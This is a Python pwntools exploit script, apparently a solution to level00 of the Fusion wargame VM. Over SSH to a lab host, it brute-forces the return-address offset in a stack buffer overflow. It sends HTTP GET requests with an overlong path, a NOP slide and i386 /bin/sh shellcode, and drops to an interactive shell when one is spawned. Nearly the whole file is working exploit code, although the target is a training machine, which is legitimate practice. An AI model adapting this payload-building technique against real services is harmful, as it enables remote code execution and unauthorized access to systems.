from pwn import *
from pwnhelper import *

remote_binary = "/opt/fusion/bin/level00"
cloned_binary = "/tmp/docgilclonedbinary"
remote_payload_file = "/tmp/docgil"
port = 20000


s = ssh("fusion", "192.168.2.129", keyfile="/home/kali/.ssh/id_rsa")
s.download_file(remote_binary, cloned_binary)

context.clear()
context.binary = cloned_binary
context.log_file = "/tmp/docgillog"


ret_adr_offset = 0
while True:
    print("trying with: " + str(ret_adr_offset) + " B's...")

    nc = s.process(["nc", "localhost", str(port)])
    # "buff is at ..."
    r = nc.recv()
    print(r)
    buf_adr = re.findall(r'0x[0-9A-F]+', r.decode("utf-8"), re.I)[0]
    print("buf at:" + buf_adr)

    # build payload
    get = b"GET "
    path = b"/home/fusion/level00/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    # overwrite saved ebp
    path_overflow = b"B" * ret_adr_offset
    # this overwrites ret adr and lets us jump to big buffer on nopslide
    path_overflow += pack(int(buf_adr, 16) + 200, 32)
    proto = b" HTTP/1.1"
    nop_slide = asm(shellcraft.i386.nop()) * 200
    sh = asm(shellcraft.i386.linux.sh())

    # print("shellcode:")
    # print(sh)

    # payload = b"GET /my/example/path HTTP/1.1 SHELLCODE"
    payload = b""
    payload += get
    payload += path
    payload += path_overflow
    payload += proto
    payload += nop_slide
    payload += sh
    # payload += hello

    # print("path len")
    # print(len(path))
    # print("path with overflow len")
    # print(len(path) + len(path_overflow))
    # print("payload len:")
    # print(len(payload))

    nc.sendline(payload)
    s.upload_data(payload, remote_payload_file)
    shell = check_for_shell(nc, always_recvs=True)
    if shell:
        nc.interactive()
        exit(0)
    else:
        ret_adr_offset += 1

    # nc.interactive()
    # ret_adr_offset += 1
